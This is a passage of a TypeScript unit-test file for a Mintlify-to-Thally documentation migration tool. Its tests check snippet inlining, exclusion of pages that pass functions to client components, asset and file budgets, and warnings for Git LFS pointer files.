    // Invalid MDX (an unmatched closing tag) must not abort the whole import.
    writeFileSync(join(root, 'en', 'broken.mdx'), '---\ntitle: Broken\n---\n\n{unclosed')

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    expect(bundle.pages.map((page) => page.id)).not.toContain('en/.tooling/skills/skill')
    expect(bundle.pages.map((page) => page.id)).not.toContain('agent-context/notes')
    expect(bundle.pages.map((page) => page.id)).not.toContain('broken')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'skipped-file',
      source: 'en/broken.mdx',
      message: expect.stringContaining('does not compile as MDX'),
    }))
  })

  it('excludes a page that re-exports from a relative module the migration does not ship, but keeps relative snippet imports', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-module-'))
    mkdirSync(join(root, 'snippets'))
    mkdirSync(join(root, 'legal'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['legal/terms', 'guide'] },
    }))
    writeFileSync(join(root, 'snippets/widget.jsx'), 'export const Widget = () => <div>Hi</div>\n')
    writeFileSync(join(root, 'legal/terms.mdx'), "---\ntitle: Terms\n---\n\nexport { metadata } from './metadata';\n\nTerms text.\n")
    writeFileSync(join(root, 'guide.mdx'), "---\ntitle: Guide\n---\n\nimport { Widget } from './snippets/widget.jsx'\n\n<Widget />\n")

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).not.toContain('legal/terms')
    expect(bundle.pages.map((page) => page.id)).toContain('guide')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'skipped-file',
      source: 'legal/terms.mdx',
      message: expect.stringContaining('"./metadata"'),
    }))
  })

  it('keeps a page-local component declaration instead of forcing in a same-named global snippet', () => {
    const root = fixture()
    // Mintlify treats every /snippets/ file as an implicitly available global
    // component keyed by its filename ("Counter" here), regardless of whether
    // any page imports it.
    writeFileSync(join(root, 'snippets', 'counter.mdx'), 'export const Counter = () => <div>Global counter</div>\n')
    writeFileSync(join(root, 'en', 'widgets.mdx'), [
      '---',
      'title: Widgets',
      '---',
      '',
      'export const Counter = () => <div>Local counter</div>',
      '',
      '<Counter />',
    ].join('\n'))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    const page = bundle.pages.find((candidate) => candidate.id === 'widgets')
    expect(page?.body.match(/export const Counter/g)).toHaveLength(1)
    expect(page?.body).toContain('Local counter')
    expect(page?.body).not.toContain('Global counter')
  })

  it('strips a named-import snippet declaration so its inlined component is not duplicated', () => {
    const root = fixture()
    // Mintlify snippets can export a named binding (not just a default),
    // e.g. `import { Generator } from "/snippets/generator.mdx"`. The import
    // declaration must be replaced with its JSX body, or its function
    // declaration would render nothing at the point of use.
    writeFileSync(join(root, 'snippets', 'generator.mdx'), 'export const Generator = () => <div>Generated</div>\n')
    writeFileSync(join(root, 'en', 'generator.mdx'), [
      '---',
      'title: Generator',
      '---',
      '',
      'import { Generator } from "/snippets/generator.mdx";',
      '',
      '<Generator />',
    ].join('\n'))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    const page = bundle.pages.find((candidate) => candidate.id === 'generator')
    expect(page?.body).not.toContain('import { Generator }')
    expect(page?.body).not.toContain('export const Generator')
    expect(page?.body).toContain('<div>Generated</div>')
  })

  it('inlines named JSX snippets with quoted attribute values as valid expressions', () => {
    const root = fixture()
    writeFileSync(join(root, 'snippets', 'community.mdx'), 'export const Community = ({ url, name }) => (<Note><a href={url}>{name}</a></Note>);')
    writeFileSync(join(root, 'en', 'community.mdx'), [
      '---', 'title: Community', '---', '',
      'import { Community } from "/snippets/community.mdx";',
      '<Community url="https://example.com/a?b=1" name="A & B" />',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages.find((page) => page.id === 'community')?.body
    expect(body).toContain('href={"https://example.com/a?b=1"}')
    expect(body).toContain('{"A & B"}')
    expect(bundle.warnings.some((warning) => warning.source?.includes('community.mdx') && warning.code === 'skipped-file')).toBe(false)
  })

  it('inlines block-bodied JSX snippets with child text and CRLF source', () => {
    const root = fixture()
    writeFileSync(join(root, 'snippets', 'button.mdx'), 'export const Button = ({ href, children }) => {\r\n  return <a href={href}>{children}</a>;\r\n};\r\n')
    writeFileSync(join(root, 'en', 'button.mdx'), [
      '---', 'title: Button', '---', '',
      'import { Button } from "/snippets/button.mdx";',
      '<Button href="/guide">Read guide</Button>',
    ].join('\r\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages.find((page) => page.id === 'button')?.body
    expect(body).toContain('<a href={"/guide"}>Read guide</a>')
    expect(bundle.warnings.some((warning) => warning.source?.includes('button.mdx') && warning.code === 'skipped-file')).toBe(false)
  })

  it('resolves multiline named primitive imports from MDX snippets without executing them', () => {
    const root = fixture()
    writeFileSync(join(root, 'snippets', 'values.mdx'), 'export const product = "Example";\nexport const minimum = 2;\n')
    writeFileSync(join(root, 'en', 'values.mdx'), [
      '---', 'title: Values', '---', '',
      'import {', '  product,', '  minimum as version,', '} from "/snippets/values.mdx";',
      '', '**{product}** version {version}.',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages.find((page) => page.id === 'values')?.body
    expect(body).toContain('export const product = "Example";')
    expect(body).toContain('export const version = 2;')
    expect(body).not.toContain('/snippets/values.mdx')
  })

  it('resolves a mixed primitive and JSX import from the same MDX snippet', () => {
    const root = fixture()
    writeFileSync(join(root, 'snippets', 'note.mdx'), 'export const minimum = "1.2.0";\nexport const VersionNote = () => (<Note>Requires {minimum}</Note>);\n')
    writeFileSync(join(root, 'en', 'mixed.mdx'), [
      '---', 'title: Mixed', '---', '',
      'import {', '  minimum,', '  VersionNote,', '} from "/snippets/note.mdx";',
      '', '<VersionNote /> Version {minimum}.',
    ].join('\n'))
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const body = bundle.pages.find((page) => page.id === 'mixed')?.body
    expect(body).toContain('export const minimum = "1.2.0";')
    expect(body).toContain('<Note>Requires {minimum}</Note>')
    expect(body).not.toContain('/snippets/note.mdx')
  })

  it('retains a page with an unsupported callback shape using a noninteractive fallback', () => {
    const root = fixture()
    // Next renders an MDX page as a Server Component by default. A component
    // this migration copies (see components.ts's `copyGraph`) is always
    // marked `'use client'`; passing a plain function into it as a prop
    // throws "Functions cannot be passed directly to Client Components" at
    // render, even though the MDX compiles fine — Mintlify's own renderer
    // has no such server/client split.
    writeFileSync(join(root, 'en', 'panel.jsx'), 'export const Panel = ({ children }) => <div>{children}</div>;\n')
    writeFileSync(join(root, 'en', 'widget.mdx'), [
      '---',
      'title: Widget',
      '---',
      '',
      "import { Panel } from './panel.jsx'",
      '',
      'export const CustomBlock = ({ children }) => <div>{children}</div>;',
      '',
      '<Panel title="x" RenderComponent={CustomBlock}>Body</Panel>',
    ].join('\n'))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    expect(bundle.pages.map((page) => page.id)).toContain('widget')
    expect(bundle.pages.find((page) => page.id === 'widget')?.body).toContain('data-migration-interactive-fallback')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      source: 'en/widget.mdx',
      message: expect.stringContaining('child content was retained without the interactive control'),
    }))
  })

  it('excludes a page that passes a function to a Thally built-in already backed by a use-client module', () => {
    const root = fixture()
    // `Accordion` is a Thally runtime built-in, but its implementation
    // (`src/components/mdx/accordion.tsx`) starts with 'use client' — so a
    // function prop reaching it throws at render exactly like a prop landing
    // on an extracted component. `CLIENT_BUILTIN_COMPONENT_TAGS` in
    // components.ts confirms this and exclusion fires, same as a page whose
    // function targets a copied client component.
    writeFileSync(join(root, 'en', 'builtin-target.mdx'), [
      '---',
      'title: Builtin Target',
      '---',
      '',
      'export const CustomBlock = ({ children }) => <div>{children}</div>;',
      '',
      '<Accordion title="x" RenderComponent={CustomBlock}>Body</Accordion>',
    ].join('\n'))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    expect(bundle.pages.map((page) => page.id)).not.toContain('builtin-target')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'skipped-file',
      source: 'en/builtin-target.mdx',
      message: expect.stringContaining("passes a function to an interactive component, which can't be rendered on the server"),
    }))
  })

  it('excludes class, alias, and function-as-children shapes, but keeps values whose names start with a keyword', () => {
    const root = fixture()
    const pages: Record<string, string> = {
      'class-comp': 'export class Box extends React.Component { render() { return <div/> } }\n\n<Accordion RenderComponent={Box}>x</Accordion>',
      'alias-const': 'export const Demo = () => <div/>;\nexport const Alias = Demo;\n\n<Accordion RenderComponent={Alias}>x</Accordion>',
      'children-fn': "<Accordion title=\"t\">{() => 'x'}</Accordion>",
      'function-list': "export const functionList = ['map', 'filter'];\n\n<Tabs items={functionList}>\n<Tab title=\"a\">x</Tab>\n</Tabs>",
      'async-mode': "export const asyncMode = 'on';\n\n<Accordion title={asyncMode}>x</Accordion>",
    }
    for (const [name, body] of Object.entries(pages)) writeFileSync(join(root, 'en', `${name}.mdx`), `---\ntitle: ${name}\n---\n\n${body}\n`)

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const ids = bundle.pages.map((page) => page.id)
    const excluded = (name: string) => bundle.warnings.some((warning) => warning.code === 'skipped-file' && warning.source === `en/${name}.mdx`)

    for (const name of ['class-comp', 'alias-const', 'children-fn']) {
      expect(ids).not.toContain(name)
      expect(excluded(name)).toBe(true)
    }
    for (const name of ['function-list', 'async-mode']) {
      expect(ids).toContain(name)
      expect(excluded(name)).toBe(false)
    }
  })

  it('keeps (but warns on) a page that passes a function to a built-in this migration cannot confirm is a client component', () => {
    const root = fixture()
    // `Card` is a Thally runtime built-in that renders entirely on the
    // server (`src/components/mdx/content-cards.tsx` has no 'use client'), and it is
    // not something this migration copied or extracted either — neither
    // `EXTRACTED_CLIENT_COMPONENT_TAG` nor `CLIENT_BUILTIN_COMPONENT_TAGS`
    // matches it, so exclusion (a last resort) does not apply; the page is
    // kept and flagged for manual review instead of being dropped on an
    // unconfirmed heuristic.
    writeFileSync(join(root, 'en', 'server-builtin-target.mdx'), [
      '---',
      'title: Server Builtin Target',
      '---',
      '',
      'export const CustomBlock = ({ children }) => <div>{children}</div>;',
      '',
      '<Card title="x" RenderComponent={CustomBlock}>Body</Card>',
    ].join('\n'))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    expect(bundle.pages.map((page) => page.id)).toContain('server-builtin-target')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      source: 'en/server-builtin-target.mdx',
      message: expect.stringContaining('might pass a function'),
    }))
  })

  it('does not flag a fenced-code example of this exact shape', () => {
    const root = fixture()
    writeFileSync(join(root, 'en', 'fenced-example.mdx'), [
      '---',
      'title: Fenced Example',
      '---',
      '',
      '```jsx',
      'export const CustomBlock = () => <div />;',
      '<Accordion RenderComponent={CustomBlock} />',
      '```',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('fenced-example')
    expect(bundle.warnings.some((warning) => warning.message.includes('function'))).toBe(false)
  })

  it('does not flag a plain value prop whose initializer merely contains =>', () => {
    const root = fixture()
    writeFileSync(join(root, 'en', 'value-prop.mdx'), [
      '---',
      'title: Value Prop',
      '---',
      '',
      'export const items = [1, 2, 3].map((x) => x);',
      '',
      '<Table rows={items} />',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('value-prop')
    expect(bundle.warnings.some((warning) => warning.message.includes('function'))).toBe(false)
  })

  it('keeps a page where a string const feeds a client built-in while a function feeds an unconfirmed one, on the same page', () => {
    // Reviewer's exact input: `diagram` (a plain string) is not a function at
    // all, so `Mermaid chart={diagram}` never enters the check; `Demo` (a
    // real function) targets `Card`, which is not a confirmed client
    // boundary, so the page is kept with a warning, not excluded.
    const root = fixture()
    writeFileSync(join(root, 'en', 'value-and-function.mdx'), [
      '---',
      'title: Value And Function',
      '---',
      '',
      'export const Demo = ({ children }) => <div>{children}</div>;',
      "export const diagram = 'graph TD; A-->B';",
      '',
      '<Card render={Demo}>x</Card>',
      '',
      '<Mermaid chart={diagram} />',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('value-and-function')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      source: 'en/value-and-function.mdx',
      code: 'unsupported-config',
      message: expect.stringContaining('might pass a function'),
    }))
  })

  it('excludes a page that passes an `export function` declaration as a prop into a confirmed client component', () => {
    const root = fixture()
    writeFileSync(join(root, 'en', 'export-function.mdx'), [
      '---',
      'title: Export Function',
      '---',
      '',
      'export function Demo({ children }) { return <div>{children}</div> }',
      '',
      '<Accordion title="t" RenderComponent={Demo}>x</Accordion>',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).not.toContain('export-function')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      source: 'en/export-function.mdx',
      code: 'skipped-file',
      message: expect.stringContaining("passes a function to an interactive component, which can't be rendered on the server"),
    }))
  })

  it('excludes a page that passes an inline arrow function directly as a prop into a confirmed client component', () => {
    const root = fixture()
    writeFileSync(join(root, 'en', 'inline-arrow.mdx'), [
      '---',
      'title: Inline Arrow',
      '---',
      '',
      '<Accordion title="t" onToggle={() => console.log(1)}>x</Accordion>',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).not.toContain('inline-arrow')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      source: 'en/inline-arrow.mdx',
      code: 'skipped-file',
      message: expect.stringContaining("passes a function to an interactive component, which can't be rendered on the server"),
    }))
  })

  it('excludes a page that passes a function prop into Color.Item, a server wrapper around a client component', () => {
    const root = fixture()
    writeFileSync(join(root, 'en', 'color-item.mdx'), [
      '---',
      'title: Color Item',
      '---',
      '',
      'export const fmt = (v) => v.toUpperCase();',
      '',
      '<Color.Item name="a" value="#fff" format={fmt} />',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).not.toContain('color-item')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      source: 'en/color-item.mdx',
      code: 'skipped-file',
      message: expect.stringContaining("passes a function to an interactive component, which can't be rendered on the server"),
    }))
  })

  it('excludes a page that passes a function prop into the Color root component', () => {
    const root = fixture()
    writeFileSync(join(root, 'en', 'color-root.mdx'), [
      '---',
      'title: Color Root',
      '---',
      '',
      'export const fmt = (v) => v.toUpperCase();',
      '',
      '<Color name="a" value="#fff" format={fmt} />',
    ].join('\n'))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).not.toContain('color-root')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      source: 'en/color-root.mdx',
      code: 'skipped-file',
      message: expect.stringContaining("passes a function to an interactive component, which can't be rendered on the server"),
    }))
  })

  it('retains a fallback page in navigation', () => {
    const root = fixture()
    // The callback cannot cross the server/client boundary. The importer
    // retains its page with a fallback, so the navigation remains complete.
    writeFileSync(join(root, 'navigation.json'), JSON.stringify({
      languages: [
        {
          language: 'en',
          tabs: [{
            tab: 'Guides',
            groups: [
              { group: 'Start', pages: ['en/introduction', 'en/guides/install'] },
              { group: 'Assistant', pages: ['en/widget'] },
            ],
          }],
        },
        {
          language: 'es',
          tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['es/introduction', 'es/guides/install'] }] }],
        },
      ],
    }))
    writeFileSync(join(root, 'en', 'panel.jsx'), 'export const Panel = ({ children }) => <div>{children}</div>;\n')
    writeFileSync(join(root, 'en', 'widget.mdx'), [
      '---',
      'title: Widget',
      '---',
      '',
      "import { Panel } from './panel.jsx'",
      '',
      'export const CustomBlock = ({ children }) => <div>{children}</div>;',
      '',
      '<Panel title="x" RenderComponent={CustomBlock}>Body</Panel>',
    ].join('\n'))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    const guidesTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'Guides')
    const groupNames = guidesTab?.groups?.map((group) => group.group)
    expect(groupNames).toContain('Assistant')
    expect(JSON.stringify(bundle.docsConfig)).toContain('widget')
  })

  it('excludes a page whose unsupported npm import is referenced outside JSX, prunes it from navigation, and keeps other pages', () => {
    const root = fixture()
    // `date-fns` is not installed in the migrated project; `format` is used
    // inside a prop expression (not bare JSX), so the import can't be
    // rewritten or safely dropped. Keeping it would fail `next build` for
    // the whole site, so the page itself is excluded instead.
    writeFileSync(join(root, 'en', 'broken-import.mdx'), [
      '---',
      'title: Broken Import',
      '---',
      '',
      "import { format } from 'date-fns'",
      '',
      '<Note label={format(new Date(), \'PP\')} />',
    ].join('\n'))
    writeFileSync(join(root, 'navigation.json'), JSON.stringify({
      languages: [
        {
          language: 'en',
          tabs: [{
            tab: 'Guides',
            groups: [
              { group: 'Start', pages: ['en/introduction', 'en/guides/install'] },
              { group: 'Broken', pages: ['en/broken-import'] },
            ],
          }],
        },
        {
          language: 'es',
          tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['es/introduction', 'es/guides/install'] }] }],
        },
      ],
    }))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    expect(bundle.pages.map((page) => page.id)).not.toContain('broken-import')
    expect(bundle.pages.map((page) => page.id)).toEqual(expect.arrayContaining(['introduction', 'guides/install']))
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'skipped-file',
      source: 'en/broken-import.mdx',
      message: expect.stringContaining("'date-fns'"),
    }))
    const guidesTab = bundle.docsConfig.tabs.find((tab) => tab.tab === 'Guides')
    const groupNames = guidesTab?.groups?.map((group) => group.group)
    expect(groupNames).not.toContain('Broken')
    expect(JSON.stringify(bundle.docsConfig)).not.toContain('en/broken-import')
  })

  it('carries Mintlify theme colors into the migrated site branding', () => {
    const root = fixture()
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { $ref: './navigation.json' },
      colors: { primary: '#16A34A', light: '#07C983', dark: '#15803D', invalid: 'not-a-color' },
    }))

    const bundle = migrateRepository({
      repositoryDir: root,
      sourceUrl: 'https://github.com/acme/docs',
    })

    expect(bundle.site?.colors).toEqual({ primary: '#16A34A', light: '#07C983', dark: '#15803D' })
  })

  it('copies page-referenced assets before unreferenced ones so the budget favors what pages actually link to', () => {
    const root = fixture()
    // Alphabetically "referenced.png" sorts after "logo.svg" and
    // "unreferenced.png" sorts before "unreferenced" would, but directory
    // scan order is not what matters here: the page-referenced asset must
    // come first in the copy order regardless of its position on disk.
    writeFileSync(join(root, 'images', 'unreferenced.png'), 'unreferenced-bytes')
    writeFileSync(join(root, 'images', 'referenced.png'), 'referenced-bytes')
    writeFileSync(join(root, 'en', 'with-image.mdx'), '---\ntitle: With image\n---\n\n![Screenshot](/images/referenced.png)')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const paths = bundle.assets.map((asset) => asset.path)
    expect(paths).toContain('images/referenced.png')
    expect(paths).toContain('images/unreferenced.png')
    expect(paths.indexOf('images/referenced.png')).toBeLessThan(paths.indexOf('images/unreferenced.png'))
  })

  it('resolves a page-relative image from the site root when the page folder lacks it', () => {
    const root = fixture()
    writeFileSync(join(root, 'images', 'cloud.png'), 'cloud-bytes')
    writeFileSync(join(root, 'en', 'introduction.mdx'), '---\ntitle: Relative\n---\n\n![Cloud](./images/cloud.png)')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.find((page) => page.id === 'introduction')?.body).toContain('](/images/cloud.png)')
  })

  it('migrates .wav, .ogg, and .m4a audio assets', () => {
    const root = fixture()
    writeFileSync(join(root, 'images', 'greeting.wav'), 'wav-bytes')
    writeFileSync(join(root, 'images', 'greeting.ogg'), 'ogg-bytes')
    writeFileSync(join(root, 'images', 'greeting.m4a'), 'm4a-bytes')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const paths = bundle.assets.map((asset) => asset.path)
    expect(paths).toContain('images/greeting.wav')
    expect(paths).toContain('images/greeting.ogg')
    expect(paths).toContain('images/greeting.m4a')
  })

  it('keeps a large image referenced by a page within the aggregate budget', () => {
    const root = fixture()
    // Repository animations often exceed the ordinary 25MB asset budget.
    // Preserving a referenced one avoids a broken page.
    writeFileSync(join(root, 'images', 'huge.png'), Buffer.alloc(26_000_000))
    writeFileSync(join(root, 'en', 'with-huge-image.mdx'), '---\ntitle: Huge image\n---\n\n![Huge](/images/huge.png)')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.assets.map((asset) => asset.path)).toContain('images/huge.png')
    expect(bundle.warnings.filter((warning) => warning.message.includes('asset file'))).toEqual([])
  })

  it('reports many oversized assets in one warning with the count and the first five paths', () => {
    const root = fixture()
    for (let index = 0; index < 8; index++) writeFileSync(join(root, 'images', `big-${index}.png`), Buffer.alloc(26_000_000))

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    const skipped = bundle.warnings.filter((warning) => warning.code === 'limit-reached' && warning.message.includes('asset file'))
    expect(skipped).toHaveLength(1)
    expect(skipped[0].message).toMatch(/^8 asset files were not copied/)
    expect(skipped[0].message.match(/images\/big-\d\.png/g)).toHaveLength(5)
    expect(skipped[0].message).toContain('and 3 more')
  }, 30_000)

  it('emits no asset-skip warning when every asset is copied', () => {
    const bundle = migrateRepository({ repositoryDir: fixture(), sourceUrl: 'https://github.com/acme/docs' })
    expect(bundle.warnings.filter((warning) => /asset files? (?:was|were|is|are)/.test(warning.message))).toEqual([])
  })

  it('warns by name about a Mintlify logo/favicon that were copied but are not wired into the migrated site\'s branding', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-brand-warning-'))
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction'] },
      logo: { light: 'logo/light.svg', dark: 'logo/dark.svg' },
      favicon: 'favicon.svg',
    }))
    writeFileSync(join(root, 'introduction.mdx'), '---\ntitle: Welcome\n---\n\nWelcome.')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringMatching(/logo\/light\.svg.*logo\/dark\.svg.*favicon\.svg/s),
    }))
  })

  it('warns instead of copying a Git LFS pointer file as if it were the real asset', () => {
    const root = fixture()
    // Clone with GIT_LFS_SKIP_SMUDGE=1 leaves this exact pointer text in
    // place of the real binary when the host has no git-lfs binary.
    writeFileSync(join(root, 'images', 'diagram.png'), [
      'version https://git-lfs.github.com/spec/v1',
      'oid sha256:0000000000000000000000000000000000000000000000000000000000000',
      'size 123456',
      '',
    ].join('\n'))
    writeFileSync(join(root, 'en', 'with-lfs-image.mdx'), '---\ntitle: LFS image\n---\n\n![Diagram](/images/diagram.png)')

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.assets.map((asset) => asset.path)).not.toContain('images/diagram.png')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'unsupported-config',
      message: expect.stringMatching(/^1 asset file is a Git LFS pointer.*images\/diagram\.png.*Install git-lfs/s),
    }))
  })

  it('reports several Git LFS pointer files in one warning', () => {
    const root = fixture()
    for (const name of ['a', 'b', 'c']) {
      writeFileSync(join(root, 'images', `${name}.png`), 'version https://git-lfs.github.com/spec/v1\noid sha256:00\nsize 1\n')
    }
    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
    const lfs = bundle.warnings.filter((warning) => warning.message.includes('Git LFS pointer'))
    expect(lfs).toHaveLength(1)
    expect(lfs[0].message).toMatch(/^3 asset files are Git LFS pointers/)
  })

  // The 5,000-file budget is lowered to 50 through the maxSourceFiles seam, so
  // these scenarios need ~50 files instead of 5,000+.
  it('keeps the default version\'s referenced pages over unreferenced ones when discovery exceeds the file budget', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-discovery-budget-'))
    mkdirSync(join(root, 'v2', 'en'), { recursive: true })
    mkdirSync(join(root, 'v1', 'en'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: {
        versions: [
          { version: 'v1', tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['v1/en/introduction'] }] }] },
          { version: 'v2', default: true, tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: ['v2/en/introduction'] }] }] },
        ],
      },
    }))
    writeFileSync(join(root, 'v2', 'en', 'introduction.mdx'), '---\ntitle: Welcome v2\n---\n\nDefault version docs.')
    writeFileSync(join(root, 'v1', 'en', 'introduction.mdx'), '---\ntitle: Welcome v1\n---\n\nOlder version docs.')
    // Unreferenced filler pages under the non-default version, enough to
    // push total discovery past the 5,000-file budget: the two referenced
    // pages above must survive regardless of scan order, and the dropped
    // filler files (all under v1/) must be named in the warning.
    for (let index = 0; index < 50; index++) {
      writeFileSync(join(root, 'v1', 'en', `filler-${index}.mdx`), `---\ntitle: Filler ${index}\n---\n\nUnreferenced filler page.`)
    }

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', maxSourceFiles: 50 })

    const pageIds = bundle.pages.map((page) => page.id)
    expect(pageIds).toContain('v2/en/introduction')
    expect(pageIds).toContain('v1/en/introduction')
    expect(bundle.warnings).toContainEqual(expect.objectContaining({
      code: 'limit-reached',
      message: expect.stringMatching(/left out.*v1/s),
    }))
  }, 30_000)

  // Snippet files are inlined from disk and never become pages, so they must
  // not use up the page budget: Firecrawl's 3,452 snippets pushed its
  // unreferenced `v1/` pages (sorted after `snippets/`) over the cap while their
  // localized copies survived, leaving /es/v1/... without an English page.
  it('does not let snippet files use up the page budget', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-snippet-budget-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    mkdirSync(join(root, 'v1'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction'] },
    }))
    writeFileSync(join(root, 'introduction.mdx'), '---\ntitle: Intro\n---\n\nHello.')
    writeFileSync(join(root, 'v1', 'orphan.mdx'), '---\ntitle: Orphan\n---\n\nServed by file-based routing.')
    for (let index = 0; index < 5000; index++) {
      writeFileSync(join(root, 'snippets', `s-${index}.mdx`), `Snippet ${index}`)
    }

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).toContain('v1/orphan')
    expect(bundle.warnings.filter((warning) => warning.code === 'limit-reached')).toEqual([])
  }, 90_000)

  it('bounds snippet files with their own budget and leaves pages unaffected', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-snippet-bound-'))
    mkdirSync(join(root, 'snippets'), { recursive: true })
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { pages: ['introduction'] },
    }))
    writeFileSync(join(root, 'introduction.mdx'), '---\ntitle: Intro\n---\n\nHello.')
    for (let index = 0; index < 5003; index++) {
      writeFileSync(join(root, 'snippets', `s-${index}.mdx`), `Snippet ${index}`)
    }

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })

    expect(bundle.pages.map((page) => page.id)).toEqual(['introduction'])
    const limits = bundle.warnings.filter((warning) => warning.code === 'limit-reached')
    expect(limits).toHaveLength(1)
    expect(limits[0].message).toContain('more than 5000 snippets')
    expect(limits[0].message).toContain('3 snippet file(s) were left out')
  }, 90_000)

  it('keeps the first pages in navigation order and names what was dropped when one version alone exceeds the file budget', () => {
    const root = mkdtempSync(join(tmpdir(), 'thally-migrate-mintlify-single-version-budget-'))
    mkdirSync(join(root, 'en'), { recursive: true })
    const pageIds = Array.from({ length: 60 }, (_, index) => `en/page-${String(index).padStart(4, '0')}`)
    writeFileSync(join(root, 'docs.json'), JSON.stringify({
      $schema: 'https://mintlify.com/docs.json',
      navigation: { tabs: [{ tab: 'Guides', groups: [{ group: 'Start', pages: pageIds }] }] },
    }))
    for (const id of pageIds) writeFileSync(join(root, `${id}.mdx`), `---\ntitle: ${id}\n---\n\nPage.`)

    const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs', maxSourceFiles: 50 })

    const migrated = bundle.pages.map((page) => page.id)
    expect(migrated).toContain('en/page-0049')
    expect(migrated).not.toContain('en/page-0050')
